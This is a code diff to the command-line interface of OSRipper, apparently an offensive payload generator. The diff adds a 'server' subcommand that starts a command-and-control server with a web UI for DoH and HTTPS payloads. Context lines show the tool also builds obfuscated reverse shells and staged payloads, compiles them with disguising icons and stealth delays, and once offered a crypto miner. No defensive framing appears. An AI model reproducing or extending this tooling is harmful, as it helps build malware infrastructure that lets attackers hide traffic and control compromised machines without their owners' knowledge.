@@ -45,6 +45,9 @@ Examples:
   %(prog)s miner is deprecated for now. standby for updates
   %(prog)s custom --script malware.py           # Encrypt custom script
   %(prog)s staged -H 192.168.1.100 -p 8080      # Create staged payload
+  %(prog)s doh -d example.com                   # Create DoH C2 payload
+  %(prog)s server example.com                   # Start C2 server
+  %(prog)s server example.com --https           # Start C2 server with HTTPS
   
   # Advanced options with obfuscation and compilation
   %(prog)s reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced --compile --icon app.ico --delay
@@ -139,6 +142,19 @@ For detailed help on a specific command, run:
                                               help='Interactive mode',
                                               description='Launch interactive menu-driven interface')
     
+    # C2 Server
+    server_parser = subparsers.add_parser('server', 
+                                         help='Start C2 server',
+                                         description='Start OSRipper C2 server with web UI for managing DoH and HTTPS payloads')
+    server_parser.add_argument('domain', help='C2 domain name (e.g., example.com)')
+    server_parser.add_argument('--host', default='0.0.0.0', help='Server host address (default: 0.0.0.0)')
+    server_parser.add_argument('--port', type=int, default=5000, help='Server port (default: 5000)')
+    server_parser.add_argument('--db', default='c2_sessions.db', help='Database path (default: c2_sessions.db)')
+    server_parser.add_argument('--https', action='store_true', help='Enable HTTPS with self-signed certificate')
+    server_parser.add_argument('--cert', help='Path to certificate file (for HTTPS, auto-generated if not provided)')
+    server_parser.add_argument('--key', help='Path to private key file (for HTTPS, auto-generated if not provided)')
+    server_parser.add_argument('--debug', action='store_true', help='Enable Flask debug mode')
+    
     return parser
 
 def load_config(config_path):
@@ -176,6 +192,21 @@ def validate_args(args):
     if args.command == 'miner':
         if not (26 <= len(args.address) <= 35):
             print("[!] Invalid Bitcoin address format")
+            return False
+    
+    if args.command == 'server':
+        # Validate server arguments
+        if not (1024 <= args.port <= 65535):
+            print("[!] Port must be between 1024 and 65535")
+            return False
+        if args.cert and not os.path.isfile(args.cert):
+            print("[!] Certificate file not found")
+            return False
+        if args.key and not os.path.isfile(args.key):
+            print("[!] Key file not found")
+            return False
+        if (args.cert and not args.key) or (args.key and not args.cert):
+            print("[!] Both --cert and --key must be provided together")
             return False
     
     if args.icon and not os.path.isfile(args.icon):
@@ -368,10 +399,57 @@ def execute_doh(args):
         print(f"[*] C2 Domain: {args.domain}")
         if args.delay:
             print("[*] Stealth delay enabled (5-15 seconds)")
-        print("[i] Start C2 server with: python -m osripper.c2.server <domain>")
+        print("[i] Start C2 server with: osripper-cli server <domain>")
         print("[i] Web UI will be available at: http://localhost:5000")
     
     return True
+
+def execute_server(args):
+    """Execute C2 server startup."""
+    from .c2.server import C2Server
+    
+    if not args.quiet:
+        print(f"[*] Starting OSRipper C2 Server")
+        print(f"[*] Domain: {args.domain}")
+        print(f"[*] Host: {args.host}")
+        print(f"[*] Port: {args.port}")
+        if args.https:
+            print(f"[*] HTTPS: Enabled")
+        print(f"[*] Database: {args.db}")
+    
+    try:
+        # Create and run server
+        server = C2Server(
+            domain=args.domain,
+            db_path=args.db,
+            host=args.host,
+            port=args.port,
+            use_https=args.https,
+            cert_file=args.cert,
+            key_file=args.key
+        )
+        
+        if not args.quiet:
+            protocol = 'https' if args.https else 'http'
+            print(f"\n[+] C2 Server starting...")
+            print(f"[*] Web UI: {protocol}://{args.host}:{args.port}")
+            print(f"[*] DoH endpoint: {protocol}://{args.host}:{args.port}/dns-query")
+            print(f"[*] Press Ctrl+C to stop the server\n")
+        
+        # Run server (this blocks)
+        server.run(debug=args.debug)
+        
+        return True
+        
+    except KeyboardInterrupt:
+        if not args.quiet:
+            print("\n[*] Server stopped by user")
+        return True
+    except Exception as e:
+        print(f"[!] Server error: {e}")
+        import traceback
+        traceback.print_exc()
+        return False
 
 def post_process(args):
     """Handle post-processing options using centralized Generator."""
@@ -448,6 +526,13 @@ def main_cli():
     # Handle interactive mode
     if args.command == 'interactive':
         main_function()
+        return
+    
+    # Handle C2 server (runs indefinitely, so handle separately)
+    if args.command == 'server':
+        success = execute_server(args)
+        if not success:
+            print("[!] Server failed to start")
         return
     
     # Show banner unless quiet
